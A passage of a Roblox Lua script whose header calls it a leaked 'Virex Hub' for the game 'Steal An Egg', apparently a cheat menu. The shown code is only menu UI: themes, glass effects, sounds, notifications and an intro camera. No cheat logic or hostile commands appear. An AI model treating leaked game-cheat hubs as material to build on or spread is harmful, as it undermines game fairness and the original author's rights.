






-- VIREX UI + Virex Hub | Steal An Egg (solo funciones importantes)
-- leaked by the goat stinker leaker in sources hub 👑🤑🤑
-- leaked by stinker 
-- leaked by stinker 
-- leaked by stinker 
local VirexLib = (function()
--[[
	VIREX UI  ·  v1
	A LocalScript for your own Roblox experience.

	How to use (Roblox Studio):
	  1. StarterPlayer > StarterPlayerScripts > Insert Object > LocalScript
	  2. Paste this whole file into it and press Play.
	  3. RightShift (or the floating VIREX button on mobile) opens and closes the menu.

	Everything you may want to change is in CONFIG right below.
]]

local CONFIG = {
	ToggleKey = Enum.KeyCode.RightShift,
	Version = "v1",

	-- Fonts: Title is the big 3D text, Heading the small caps labels and tabs.
	-- Other good ones: "GothamBlack", "FredokaOne", "Bangers", "Sarpanch".
	Fonts = { Title = "LuckiestGuy", Heading = "LuckiestGuy" },

	-- Liquid glass follows the phone's tilt (accelerometer). On PC it follows the mouse.
	-- If the light moves the wrong way on your phone, flip these to true.
	Tilt = { Enabled = true, Strength = 3, InvertX = false, InvertY = false },
	LogoImage = "rbxassetid://107391174248131",

	-- The animated orb (made from the GIF). It floats over every background.
	Orb = { Image = "rbxassetid://115422258718188", Columns = 6, Rows = 6, Frames = 36, FPS = 18, Size = 1020 },

	DefaultTheme = "Noir",

	-- Sounds (Roblox built-in). Swap any of these for "rbxassetid://..." sounds from the Creator Store.
	Sounds = {
		Enabled = true,
		Volume = 0.6,
		Click = "rbxasset://sounds/clickfast.wav",
		Hover = "rbxasset://sounds/clickfast.wav",
		Toggle = "rbxasset://sounds/electronicpingshort.wav",
		Notify = "rbxasset://sounds/electronicpingshort.wav",
		Open = "rbxasset://sounds/swordlunge.wav",
		Close = "rbxasset://sounds/swordlunge.wav",
		Slam = "rbxasset://sounds/swordslash.wav",
		Slider = "rbxasset://sounds/electronicpingshort.wav", -- plays while dragging; pitch follows the value
		Boom = "rbxasset://sounds/swordslash.wav",
	},

	--[[ THEMES
		Background: "rbxassetid://..." photo behind the menu and the intro ("" = colour gradient only)
		Gif:        "rbxassetid://..." animated background (a sprite sheet made from a GIF). Wins over Background.
		            Frames / FPS: how many pictures the sheet has and how fast they play.
		Dim:        how dark the photo is (0 = fully visible, 1 = hidden)
		Accent / Accent2 / Hot: button, glow and border colours
		Panel / Card / Card2:  window and card colours
		Copy a block to add more themes. ]]
	Themes = {
		{ Name = "Noir", Background = "rbxassetid://95845335655412", Dim = 0.12,
			Accent = Color3.fromRGB(235, 236, 240), Accent2 = Color3.fromRGB(255, 255, 255), Hot = Color3.fromRGB(120, 122, 130),
			Panel = Color3.fromRGB(9, 9, 11), Card = Color3.fromRGB(20, 20, 24), Card2 = Color3.fromRGB(32, 32, 38) },
		{ Name = "Ice", Background = "rbxassetid://95845335655412", Dim = 0.12,
			Accent = Color3.fromRGB(47, 107, 255), Accent2 = Color3.fromRGB(169, 216, 255), Hot = Color3.fromRGB(255, 92, 170),
			Panel = Color3.fromRGB(10, 13, 24), Card = Color3.fromRGB(22, 28, 46), Card2 = Color3.fromRGB(32, 40, 64) },
		{ Name = "Violet", Background = "rbxassetid://109682858333398", Dim = 0.12,
			Accent = Color3.fromRGB(138, 76, 255), Accent2 = Color3.fromRGB(214, 190, 255), Hot = Color3.fromRGB(255, 120, 220),
			Panel = Color3.fromRGB(14, 10, 26), Card = Color3.fromRGB(30, 22, 50), Card2 = Color3.fromRGB(44, 32, 70) },
		{ Name = "Crimson", Background = "rbxassetid://103964167589822", Dim = 0.12,
			Accent = Color3.fromRGB(255, 60, 92), Accent2 = Color3.fromRGB(255, 185, 195), Hot = Color3.fromRGB(255, 170, 60),
			Panel = Color3.fromRGB(20, 8, 12), Card = Color3.fromRGB(40, 16, 24), Card2 = Color3.fromRGB(58, 24, 34) },
		{ Name = "Mint", Background = "rbxassetid://80469187866764", Dim = 0.12,
			Accent = Color3.fromRGB(30, 200, 140), Accent2 = Color3.fromRGB(170, 255, 220), Hot = Color3.fromRGB(80, 180, 255),
			Panel = Color3.fromRGB(7, 18, 16), Card = Color3.fromRGB(14, 36, 31), Card2 = Color3.fromRGB(20, 50, 44) },
		{ Name = "Sunset", Background = "rbxassetid://130939890430008", Dim = 0.12,
			Accent = Color3.fromRGB(255, 120, 50), Accent2 = Color3.fromRGB(255, 212, 155), Hot = Color3.fromRGB(255, 70, 140),
			Panel = Color3.fromRGB(22, 11, 9), Card = Color3.fromRGB(42, 23, 18), Card2 = Color3.fromRGB(58, 32, 24) },
		{ Name = "Void", Background = "", Dim = 0.12,
			Accent = Color3.fromRGB(160, 175, 215), Accent2 = Color3.fromRGB(240, 244, 252), Hot = Color3.fromRGB(110, 130, 255),
			Panel = Color3.fromRGB(7, 7, 11), Card = Color3.fromRGB(20, 20, 27), Card2 = Color3.fromRGB(32, 32, 42) },

		-- Motion backgrounds (sprite sheets made from GIFs). Columns/Rows/Width/Height only when the sheet is not 4 x 6.
		{ Name = "Orb", Gif = "rbxassetid://115422258718188", Frames = 36, FPS = 18, Columns = 6, Rows = 6, Width = 1020, Height = 1020, Dim = 0.05,
			Accent = Color3.fromRGB(235, 236, 240), Accent2 = Color3.fromRGB(255, 255, 255), Hot = Color3.fromRGB(120, 122, 130),
			Panel = Color3.fromRGB(6, 6, 8), Card = Color3.fromRGB(18, 18, 22), Card2 = Color3.fromRGB(30, 30, 36) },
		{ Name = "Ocean", Gif = "rbxassetid://92203048087211", Frames = 24, FPS = 12.5, Dim = 0.1,
			Accent = Color3.fromRGB(90, 190, 255), Accent2 = Color3.fromRGB(200, 240, 255), Hot = Color3.fromRGB(40, 120, 200),
			Panel = Color3.fromRGB(4, 14, 22), Card = Color3.fromRGB(8, 26, 38), Card2 = Color3.fromRGB(14, 40, 56) },
		{ Name = "Heaven", Gif = "rbxassetid://110550227129244", Frames = 24, FPS = 12.5, Dim = 0.1,
			Accent = Color3.fromRGB(120, 200, 255), Accent2 = Color3.fromRGB(255, 255, 255), Hot = Color3.fromRGB(80, 160, 230),
			Panel = Color3.fromRGB(12, 26, 44), Card = Color3.fromRGB(20, 40, 64), Card2 = Color3.fromRGB(30, 56, 86) },
		{ Name = "Stream", Gif = "rbxassetid://125722914688906", Frames = 19, FPS = 16.7, Dim = 0.1,
			Accent = Color3.fromRGB(150, 210, 110), Accent2 = Color3.fromRGB(230, 245, 200), Hot = Color3.fromRGB(240, 200, 110),
			Panel = Color3.fromRGB(10, 16, 8), Card = Color3.fromRGB(20, 30, 16), Card2 = Color3.fromRGB(30, 44, 24) },
		{ Name = "Inferno", Gif = "rbxassetid://116811530360656", Frames = 24, FPS = 11.2, Dim = 0.1,
			Accent = Color3.fromRGB(255, 170, 50), Accent2 = Color3.fromRGB(255, 230, 160), Hot = Color3.fromRGB(255, 90, 30),
			Panel = Color3.fromRGB(22, 12, 4), Card = Color3.fromRGB(40, 22, 8), Card2 = Color3.fromRGB(58, 32, 12) },
		{ Name = "Golden", Gif = "rbxassetid://86953866218071", Frames = 24, FPS = 11.7, Dim = 0.1,
			Accent = Color3.fromRGB(255, 210, 110), Accent2 = Color3.fromRGB(255, 245, 210), Hot = Color3.fromRGB(150, 210, 90),
			Panel = Color3.fromRGB(20, 16, 6), Card = Color3.fromRGB(36, 30, 12), Card2 = Color3.fromRGB(52, 44, 18) },
		{ Name = "Night", Gif = "rbxassetid://129010370853587", Frames = 12, FPS = 14.3, Dim = 0.05,
			Accent = Color3.fromRGB(220, 222, 228), Accent2 = Color3.fromRGB(255, 255, 255), Hot = Color3.fromRGB(130, 132, 140),
			Panel = Color3.fromRGB(10, 10, 12), Card = Color3.fromRGB(22, 22, 26), Card2 = Color3.fromRGB(34, 34, 40) },
		{ Name = "Black Hole", Gif = "rbxassetid://134072355345185", Frames = 24, FPS = 20, Dim = 0.05,
			Accent = Color3.fromRGB(235, 236, 240), Accent2 = Color3.fromRGB(255, 255, 255), Hot = Color3.fromRGB(110, 112, 120),
			Panel = Color3.fromRGB(4, 4, 6), Card = Color3.fromRGB(16, 16, 20), Card2 = Color3.fromRGB(28, 28, 34) },
		{ Name = "Forest", Gif = "rbxassetid://134614395274312", Frames = 24, FPS = 14.3, Dim = 0.1,
			Accent = Color3.fromRGB(240, 190, 80), Accent2 = Color3.fromRGB(255, 235, 170), Hot = Color3.fromRGB(170, 200, 70),
			Panel = Color3.fromRGB(18, 14, 4), Card = Color3.fromRGB(34, 28, 10), Card2 = Color3.fromRGB(48, 40, 16) },
	},
}

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local Lighting = game:GetService("Lighting")
local Workspace = game:GetService("Workspace")
local GuiService = game:GetService("GuiService")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

local WHITE, BLACK = Color3.new(1, 1, 1), Color3.new(0, 0, 0)
local Theme = {
	Bg = Color3.fromRGB(3, 4, 10),
	Text = Color3.fromRGB(244, 247, 252),
	Muted = Color3.fromRGB(150, 158, 178),
	Dark = Color3.fromRGB(8, 10, 18),
	Good = Color3.fromRGB(125, 255, 178),
	Bad = Color3.fromRGB(255, 107, 122),
}
local THEME_KEYS = { "Accent", "Accent2", "Hot", "Panel", "Card", "Card2" }
local currentTheme = CONFIG.Themes[1]
for _, t in ipairs(CONFIG.Themes) do
	if t.Name == CONFIG.DefaultTheme then currentTheme = t end
end
local function loadThemeColors(t)
	for _, k in ipairs(THEME_KEYS) do Theme[k] = t[k] end
end
loadThemeColors(currentTheme)

local function pickFont(name, fallback)
	local ok, f = pcall(function() return Enum.Font[name] end)
	return (ok and f) or fallback
end
local FONT_TITLE = pickFont((CONFIG.Fonts or {}).Title or "", Enum.Font.GothamBlack)
local FONT_HEAD = pickFont((CONFIG.Fonts or {}).Heading or "", Enum.Font.GothamBlack)
-- everything written in the title / heading font, so the font can be changed live
local fontTargets, epicTexts = {}, {}
local function fontProp(inst)
	table.insert(fontTargets, inst)
	return inst
end
local function setFonts(f)
	FONT_TITLE, FONT_HEAD = f, f
	for _, inst in ipairs(fontTargets) do if inst.Parent then inst.Font = f end end
	for _, et in ipairs(epicTexts) do if et.group.Parent then et.refont(f) end end
end

---------------------------------------------------------------------------
-- Helpers
---------------------------------------------------------------------------
local connections = {}
local function bind(signal, fn)
	local c = signal:Connect(fn)
	table.insert(connections, c)
	return c
end

local function new(class, props, children)
	local inst = Instance.new(class)
	local parent = nil
	for k, v in pairs(props or {}) do
		if k == "Parent" then parent = v else inst[k] = v end
	end
	for _, child in ipairs(children or {}) do child.Parent = inst end
	if parent then inst.Parent = parent end
	return inst
end

local Q, BACK, ELASTIC, SINE, QUAD, EXPO = Enum.EasingStyle.Quint, Enum.EasingStyle.Back, Enum.EasingStyle.Elastic, Enum.EasingStyle.Sine, Enum.EasingStyle.Quad, Enum.EasingStyle.Exponential
local IN, OUT, INOUT = Enum.EasingDirection.In, Enum.EasingDirection.Out, Enum.EasingDirection.InOut
local function tween(inst, time, props, style, dir, delayTime)
	local t = TweenService:Create(inst, TweenInfo.new(time, style or Q, dir or OUT, 0, false, delayTime or 0), props)
	t:Play()
	return t
end

local function corner(r) return new("UICorner", { CornerRadius = r and UDim.new(0, r) or UDim.new(1, 0) }) end
local function pad(t, r, b, l)
	return new("UIPadding", { PaddingTop = UDim.new(0, t), PaddingRight = UDim.new(0, r or t), PaddingBottom = UDim.new(0, b or t), PaddingLeft = UDim.new(0, l or r or t) })
end
local function stroke(color, thickness, transparency)
	return new("UIStroke", { Color = color, Thickness = thickness or 1, Transparency = transparency or 0, ApplyStrokeMode = Enum.ApplyStrokeMode.Border })
end
local function seq(list)
	local kps = {}
	for i, c in ipairs(list) do table.insert(kps, ColorSequenceKeypoint.new((i - 1) / (#list - 1), c)) end
	return ColorSequence.new(kps)
end
local function nseq(list)
	local kps = {}
	for _, p in ipairs(list) do table.insert(kps, NumberSequenceKeypoint.new(p[1], p[2])) end
	return NumberSequence.new(kps)
end

local spinners, shimmers = {}, {}
local function spinGradient(g, speed) table.insert(spinners, { g = g, s = speed or 90 }) return g end
local function shimmerGradient(g, speed) table.insert(shimmers, { g = g, s = speed or 0.6 }) return g end

-- Elements that follow the theme colours
local themed = {}
local function themeProp(inst, prop, key)
	table.insert(themed, { inst = inst, prop = prop, key = key or "Accent" })
	return inst
end
local function borderSeq() return seq({ WHITE, Color3.fromRGB(110, 112, 120), WHITE, Color3.fromRGB(46, 48, 54), WHITE }) end
local borderGradients = {}
local function themedBorder(g) table.insert(borderGradients, g) g.Color = borderSeq() return g end

local function guiY(y) return y + GuiService:GetGuiInset().Y end
local function isPress(input) return input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch end
local function isMove(input) return input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch end

local camera = Workspace.CurrentCamera
local function viewport() return camera and camera.ViewportSize or Vector2.new(1280, 720) end
local isMobile = UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled

-- Liquid glass: see-through body so the background shows, a top sheen and a bright rim.
-- The sheen and the rim light follow the phone's tilt (or the mouse on PC), see the loop below.
local glassRims, glassSheens = {}, {}
local tilt = Vector2.new(0, 0)
local function liquidGlass(inst, transparency, rimRotation)
	inst.BackgroundTransparency = transparency or 0.5
	inst:SetAttribute("GlassT", inst.BackgroundTransparency)
	local sheen = new("UIGradient", { Parent = inst, Rotation = 90,
		Color = seq({ WHITE, Color3.fromRGB(200, 202, 210), Color3.fromRGB(150, 152, 160) }),
		Transparency = nseq({ { 0, 0 }, { 0.45, 0.12 }, { 1, 0.2 } }) })
	table.insert(glassSheens, sheen)
	local rim = stroke(WHITE, 1.2, 0)
	rim.Parent = inst
	local rg = new("UIGradient", { Parent = rim, Rotation = rimRotation or 115,
		Color = seq({ WHITE, Color3.fromRGB(110, 112, 120), Color3.fromRGB(36, 38, 44), Color3.fromRGB(70, 72, 80), Color3.fromRGB(210, 212, 220) }),
		Transparency = nseq({ { 0, 0 }, { 0.5, 0.55 }, { 1, 0.1 } }) })
	table.insert(glassRims, { g = rg, base = rimRotation or 115 })
	return rim
end

-- Glass states: idle (see-through), hover (a bit darker), held down (darker, like selected)
local glassScales, heldGlass = {}, nil
local function glassLook(inst, state)
	local base = inst:GetAttribute("GlassT") or 0.5
	local idle = Theme[inst:GetAttribute("GlassKey") or "Card"] or Theme.Card
	if state == "press" then
		tween(inst, 0.16, { BackgroundTransparency = math.max(0.06, base - 0.36), BackgroundColor3 = idle:Lerp(BLACK, 0.85) }, QUAD)
	elseif state == "hover" then
		tween(inst, 0.3, { BackgroundTransparency = math.max(0.12, base - 0.2), BackgroundColor3 = idle:Lerp(BLACK, 0.55) }, Q)
	else
		tween(inst, 0.5, { BackgroundTransparency = base, BackgroundColor3 = idle }, Q)
	end
end
local function glassInteract(inst, sc)
	glassScales[inst] = sc
	inst:SetAttribute("Hovered", false)
	bind(inst.MouseEnter, function()
		inst:SetAttribute("Hovered", true)
		if heldGlass ~= inst then glassLook(inst, "hover") if sc then tween(sc, 0.45, { Scale = 1.025 }, Q) end end
	end)
	bind(inst.MouseLeave, function()
		inst:SetAttribute("Hovered", false)
		if heldGlass ~= inst then glassLook(inst, "idle") if sc then tween(sc, 0.45, { Scale = 1 }, Q) end end
	end)
	bind(inst.InputBegan, function(input)
		if isPress(input) then
			heldGlass = inst
			glassLook(inst, "press")
			if sc then tween(sc, 0.18, { Scale = 0.965 }, QUAD) end
		end
	end)
end
bind(UserInputService.InputEnded, function(input)
	if heldGlass and isPress(input) then
		local g = heldGlass
		heldGlass = nil
		local hovered = g:GetAttribute("Hovered") and not isMobile
		glassLook(g, hovered and "hover" or "idle")
		local sc = glassScales[g]
		if sc then tween(sc, 0.55, { Scale = hovered and 1.025 or 1 }, BACK) end
	end
end)

-- Spark burst from a point (clicks and toggles)
local function burst(parent, cx, cy, color, count)
	count = count or 8
	for i = 1, count do
		local a = (i / count) * math.pi * 2 + math.random() * 0.4
		local d = math.random(18, 34)
		local s = math.random(3, 5)
		local p = new("Frame", {
			Parent = parent, AnchorPoint = Vector2.new(0.5, 0.5), Position = UDim2.fromOffset(cx, cy), Size = UDim2.fromOffset(s, s),
			BackgroundColor3 = color or Theme.Accent2, BorderSizePixel = 0, ZIndex = parent.ZIndex + 8,
		}, { corner() })
		tween(p, 0.55, { Position = UDim2.fromOffset(cx + math.cos(a) * d, cy + math.sin(a) * d), Size = UDim2.fromOffset(0, 0), BackgroundTransparency = 1 }, Q)
		task.delay(0.6, function() p:Destroy() end)
	end
end

-- Press feedback: squash, then a soft rebound
local function pressBounce(scaleObj, amount)
	tween(scaleObj, 0.1, { Scale = amount or 0.93 }, QUAD)
	task.delay(0.1, function() tween(scaleObj, 0.55, { Scale = 1 }, BACK, OUT) end)
end

---------------------------------------------------------------------------
-- Root
---------------------------------------------------------------------------
local old = playerGui:FindFirstChild("VirexUI")
if old then old:Destroy() end
local gui = new("ScreenGui", { Name = "VirexUI", ResetOnSpawn = false, IgnoreGuiInset = true, ZIndexBehavior = Enum.ZIndexBehavior.Sibling, DisplayOrder = 50, Parent = playerGui })
local blur = Lighting:FindFirstChild("VirexBlur") or new("BlurEffect", { Name = "VirexBlur", Size = 0, Parent = Lighting })
local function setBlur(size) tween(blur, 0.6, { Size = size }) end

---------------------------------------------------------------------------
-- Animated sprite sheets (the GIF)
---------------------------------------------------------------------------
local animated = {}
local function applySheet(img, sheet)
	animated[img] = nil
	if sheet and (sheet.Image or "") ~= "" then
		local size = sheet.Size or 1024
		img.Image = sheet.Image
		img.ImageRectSize = Vector2.new((sheet.Width or size) / sheet.Columns, (sheet.Height or size) / sheet.Rows)
		img.ImageRectOffset = Vector2.new(0, 0)
		animated[img] = sheet
	else
		img.ImageRectSize = Vector2.new(0, 0)
		img.ImageRectOffset = Vector2.new(0, 0)
	end
end
-- Animated theme backgrounds: every sheet is 4 x 6 frames of 256 x 170 (1024 x 1020)
local function themeSheet(t)
	if (t.Gif or "") == "" then return nil end
	return { Image = t.Gif, Columns = t.Columns or 4, Rows = t.Rows or 6, Width = t.Width or 1024, Height = t.Height or 1020, Frames = t.Frames or 24, FPS = t.FPS or 12 }
end
local function orbView(parent, size, z)
	local holder = new("CanvasGroup", { Parent = parent, AnchorPoint = Vector2.new(0.5, 0.5), Size = UDim2.fromOffset(size, size), BackgroundTransparency = 1, ZIndex = z }, { corner() })
	local img = new("ImageLabel", { Parent = holder, Position = UDim2.fromScale(-0.06, -0.06), Size = UDim2.fromScale(1.12, 1.12), BackgroundTransparency = 1, ZIndex = z })
	applySheet(img, CONFIG.Orb)
	return holder, img
end

---------------------------------------------------------------------------
-- Logo with fake depth (stacked layers) and a glow
---------------------------------------------------------------------------
local logoShines = {}
local function logoRig(parent, size, z)
	local rig = new("Frame", { Parent = parent, AnchorPoint = Vector2.new(0.5, 0.5), Size = UDim2.fromOffset(size, size), BackgroundTransparency = 1, ZIndex = z })
	-- spinning light ring
	local ring = new("Frame", { Parent = rig, AnchorPoint = Vector2.new(0.5, 0.5), Position = UDim2.fromScale(0.5, 0.52), Size = UDim2.fromScale(1.22, 1.22), BackgroundTransparency = 1, ZIndex = z }, { corner() })
	local rs = stroke(WHITE, math.max(1, size / 70), 0)
	rs.Parent = ring
	spinGradient(themedBorder(new("UIGradient", { Parent = rs })), 140)
	-- coloured glow copy
	local glowImg = new("ImageLabel", {
		Parent = rig, AnchorPoint = Vector2.new(0.5, 0.5), Position = UDim2.fromScale(0.5, 0.5), Size = UDim2.fromScale(1.12, 1.12), BackgroundTransparency = 1,
		Image = CONFIG.LogoImage, ImageColor3 = Theme.Accent2, ImageTransparency = 1, Visible = false, ZIndex = z,
	})
	themeProp(glowImg, "ImageColor3", "Accent2")
	-- the logo itself
	new("ImageLabel", { Parent = rig, Size = UDim2.fromScale(1, 1), BackgroundTransparency = 1, Image = CONFIG.LogoImage, ZIndex = z + 1 })
	-- shine: a white copy of the logo with a moving bright band, so the light only touches the logo
	local shine = new("ImageLabel", { Parent = rig, Size = UDim2.fromScale(1, 1), BackgroundTransparency = 1, Image = CONFIG.LogoImage, ImageColor3 = WHITE, ZIndex = z + 2 })
	local sg = new("UIGradient", { Parent = shine, Rotation = 25, Offset = Vector2.new(-1, 0), Transparency = nseq({ { 0, 1 }, { 0.4, 1 }, { 0.5, 0.1 }, { 0.6, 1 }, { 1, 1 } }) })
	table.insert(logoShines, sg)
	return rig, glowImg
end
local function shineLogo(sg)
	sg.Offset = Vector2.new(-1, 0)
	tween(sg, 0.9, { Offset = Vector2.new(1, 0) }, SINE, INOUT)
end
-- Coin-flip spin: squeeze the width to 0 and back
local function flip(rig, size, times, speed)
	task.spawn(function()
		for _ = 1, times or 1 do
			if not rig.Parent then return end
			tween(rig, speed or 0.22, { Size = UDim2.fromOffset(0, size) }, SINE, IN).Completed:Wait()
			tween(rig, speed or 0.22, { Size = UDim2.fromOffset(size, size) }, SINE, OUT).Completed:Wait()
		end
	end)
end

---------------------------------------------------------------------------
-- Sounds
---------------------------------------------------------------------------
local function sfx(name, speed, volume)
	local S = CONFIG.Sounds
	if not S or not S.Enabled then return end
	local id = S[name]
	if not id or id == "" then return end
	local s = new("Sound", { SoundId = id, Volume = (volume or 1) * (S.Volume or 0.6), PlaybackSpeed = speed or 1, Parent = gui })
	s:Play()
	task.delay(4, function() s:Destroy() end)
end

---------------------------------------------------------------------------
-- Epic text: glowing bloom, gradient that swirls inside, crisp edge, light sweep
---------------------------------------------------------------------------
local TextService = game:GetService("TextService")
local textShines = {}
local function epicText(parent, text, size, z, colors)
	local font = FONT_TITLE
	local b = TextService:GetTextSize(text, size, font, Vector2.new(10000, 10000))
	local depth = math.max(2, math.floor(size * 0.06))
	local padX, padY = math.floor(size * 0.12) + depth, math.floor(size * 0.1) + depth
	local group = new("CanvasGroup", { Parent = parent, BackgroundTransparency = 1, Size = UDim2.fromOffset(b.X + padX * 2, b.Y + padY * 2), ZIndex = z })
	local labels = {}
	local function layer(zz, d, color)
		local l = new("TextLabel", { Parent = group, BackgroundTransparency = 1, Position = UDim2.fromOffset(padX + d, padY + d), Size = UDim2.fromOffset(b.X, b.Y), Font = font, Text = text, TextSize = size, TextColor3 = color, ZIndex = zz })
		table.insert(labels, l)
		return l
	end
	-- solid extrusion: stacked dark copies give real-looking depth
	for d = depth, 1, -1 do
		local shade = math.floor(14 + (depth - d) / depth * 46)
		local l = layer(z, d, Color3.fromRGB(shade, shade, shade + 3))
		new("UIStroke", { Parent = l, Color = BLACK, Thickness = math.max(1.5, size * 0.035), LineJoinMode = Enum.LineJoinMode.Round })
	end
	-- face: white-to-silver chrome with a crisp black edge
	local main = layer(z + 1, 0, WHITE)
	local fill = new("UIGradient", { Parent = main, Rotation = 90, Color = colors or seq({ WHITE, Color3.fromRGB(236, 237, 241), Color3.fromRGB(168, 170, 178), Color3.fromRGB(246, 246, 249) }) })
	new("UIStroke", { Parent = main, Color = BLACK, Thickness = math.max(1.5, size * 0.035), LineJoinMode = Enum.LineJoinMode.Round })
	local scale = new("UIScale", { Parent = group })
	local et = { group = group, labels = labels, main = main, glow = {}, fill = fill, scale = scale, padX = padX, padY = padY, width = b.X + padX * 2 }
	-- swap the font and resize so nothing gets cut
	function et.refont(f)
		local nb = TextService:GetTextSize(text, size, f, Vector2.new(10000, 10000))
		group.Size = UDim2.fromOffset(nb.X + padX * 2, nb.Y + padY * 2)
		for _, l in ipairs(labels) do l.Font = f l.Size = UDim2.fromOffset(nb.X, nb.Y) end
		et.width = nb.X + padX * 2
	end
	table.insert(epicTexts, et)
	return et
end
-- Light sweep: the chrome highlight slides down across the face
local function sweepText(t, time)
	t.fill.Offset = Vector2.new(0, -0.8)
	tween(t.fill, time or 0.8, { Offset = Vector2.new(0, 0) }, Q, OUT)
end

---------------------------------------------------------------------------
-- Notifications
---------------------------------------------------------------------------
-- Small toasts at the top of the screen, above the menu. Only one at a time:
-- a new one makes the current one leave first, then glides in.
local toastHolder = new("Frame", { Parent = gui, AnchorPoint = Vector2.new(0.5, 0), Position = UDim2.new(0.5, isMobile and 70 or 0, 0, 6), Size = UDim2.fromOffset(250, 40), BackgroundTransparency = 1, ZIndex = 200 })
local toastQueue, toastCurrent = {}, nil
local showNextToast
local function hideToast(tst)
	if tst.leaving then return end
	tst.leaving = true
	-- a soft shine right to left, then it lifts away
	tst.shine.Offset = Vector2.new(1.3, 0)
	tween(tst.shine, 0.4, { Offset = Vector2.new(-1.3, 0) }, SINE, INOUT)
	tween(tst.group, 0.45, { Position = UDim2.new(0.5, 0, 0, -46) }, Q, IN, 0.12)
	tween(tst.group, 0.35, { GroupTransparency = 1 }, SINE, IN, 0.2)
	tween(tst.scale, 0.45, { Scale = 0.9 }, Q, IN, 0.12)
	task.delay(0.6, function()
		tst.group:Destroy()
		if toastCurrent == tst then toastCurrent = nil end
		showNextToast()
	end)
end
showNextToast = function()
	if toastCurrent or #toastQueue == 0 then return end
	local item = table.remove(toastQueue, 1)
	local text = item.text ~= "" and ("  " .. item.text) or ""
	local w = math.clamp(TextService:GetTextSize(string.upper(item.title), 14, FONT_HEAD, Vector2.new(1000, 40)).X + TextService:GetTextSize(text, 12, Enum.Font.GothamMedium, Vector2.new(1000, 40)).X + 70, 150, 300)
	local group = new("CanvasGroup", { Parent = toastHolder, AnchorPoint = Vector2.new(0.5, 0), BackgroundTransparency = 1, Size = UDim2.fromOffset(w, 40), Position = UDim2.new(0.5, 0, 0, -46), GroupTransparency = 1, ZIndex = 201 })
	local gsc = new("UIScale", { Parent = group, Scale = 0.9 })
	local card = new("Frame", { Parent = group, BackgroundColor3 = Theme.Panel, Position = UDim2.fromOffset(2, 2), Size = UDim2.new(1, -4, 1, -4), ZIndex = 202 }, { corner() })
	liquidGlass(card, 0.18)
	local icon = new("ImageLabel", { Parent = card, AnchorPoint = Vector2.new(0, 0.5), Position = UDim2.new(0, 5, 0.5, 0), Size = UDim2.fromOffset(26, 26), BackgroundColor3 = BLACK, BackgroundTransparency = 0.4, Image = CONFIG.LogoImage, ZIndex = 203 }, { corner() })
	local line = new("Frame", { Parent = card, Position = UDim2.fromOffset(38, 0), Size = UDim2.new(1, -54, 1, 0), BackgroundTransparency = 1, ZIndex = 203 },
		{ new("UIListLayout", { FillDirection = Enum.FillDirection.Horizontal, VerticalAlignment = Enum.VerticalAlignment.Center, SortOrder = Enum.SortOrder.LayoutOrder }) })
	local t1 = new("TextLabel", { Parent = line, BackgroundTransparency = 1, AutomaticSize = Enum.AutomaticSize.X, Size = UDim2.fromOffset(0, 20), Font = FONT_HEAD, TextSize = 14, TextColor3 = Theme.Text, Text = string.upper(item.title), LayoutOrder = 1, ZIndex = 204 })
	new("UIStroke", { Parent = t1, Color = BLACK, Thickness = 1, Transparency = 0.4 })
	local t2 = new("TextLabel", { Parent = line, BackgroundTransparency = 1, AutomaticSize = Enum.AutomaticSize.X, Size = UDim2.fromOffset(0, 20), Font = Enum.Font.GothamMedium, TextSize = 12, TextColor3 = Theme.Muted, TextTransparency = 1, Text = text, LayoutOrder = 2, ZIndex = 204 })
	-- status light on the right (green on, red off, or the colour given)
	local dot = new("Frame", { Parent = card, AnchorPoint = Vector2.new(1, 0.5), Position = UDim2.new(1, -12, 0.5, 0), Size = UDim2.fromOffset(0, 0), BackgroundColor3 = item.color or Theme.Accent2, ZIndex = 204 }, { corner() })
	local shineF = new("Frame", { Parent = card, Size = UDim2.fromScale(1, 1), BackgroundColor3 = WHITE, BorderSizePixel = 0, ZIndex = 205 }, { corner() })
	local shine = new("UIGradient", { Parent = shineF, Rotation = 15, Offset = Vector2.new(-1.3, 0), Transparency = nseq({ { 0, 1 }, { 0.42, 1 }, { 0.5, 0.45 }, { 0.58, 1 }, { 1, 1 } }) })
	local tst = { group = group, scale = gsc, shine = shine, leaving = false }
	toastCurrent = tst
	sfx("Notify", 1.15, 0.35)
	-- glide down and settle, then a light runs across
	tween(group, 0.7, { Position = UDim2.new(0.5, 0, 0, 0) }, Q, OUT)
	tween(group, 0.45, { GroupTransparency = 0 }, SINE, OUT)
	tween(gsc, 0.7, { Scale = 1 }, Q, OUT)
	local isc = new("UIScale", { Parent = icon, Scale = 0.5 })
	tween(isc, 0.6, { Scale = 1 }, BACK, OUT, 0.15)
	tween(t2, 0.5, { TextTransparency = 0 }, SINE, OUT, 0.25)
	tween(dot, 0.5, { Size = UDim2.fromOffset(8, 8) }, BACK, OUT, 0.3)
	tween(shine, 0.8, { Offset = Vector2.new(1.3, 0) }, SINE, INOUT, 0.3)
	task.delay(item.duration, function() hideToast(tst) end)
end
local function notify(title, text, duration, color)
	-- only the newest waits: quick taps never pile up
	toastQueue = { { title = title, text = text or "", duration = math.min(duration or 2.2, 3), color = color } }
	if toastCurrent then hideToast(toastCurrent) else showNextToast() end
end

---------------------------------------------------------------------------
-- Intro
---------------------------------------------------------------------------
-- Cinematic camera (GTA style): starts high up in the sky looking down at you, spins and banks
-- as it drops, and lands right behind your back looking where you look.
local function cinematicCamera(duration)
	local cam = Workspace.CurrentCamera
	local t0 = os.clock()
	while not (player.Character and player.Character:FindFirstChild("HumanoidRootPart")) and os.clock() - t0 < 5 do task.wait(0.1) end
	local hrp = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
	if not (cam and hrp) then return function() end, function() end end
	local oldFov = cam.FieldOfView
	cam.CameraType = Enum.CameraType.Scriptable
	local look = hrp.CFrame.LookVector
	local flat = Vector3.new(look.X, 0, look.Z)
	flat = flat.Magnitude > 0.01 and flat.Unit or Vector3.new(0, 0, -1)
	local backAngle = math.atan2(-flat.Z, -flat.X)
	local turns = 1.25 * math.pi * 2
	local baseFov = 60
	local start = os.clock()
	local conn = RunService.RenderStepped:Connect(function()
		if not hrp.Parent then return end
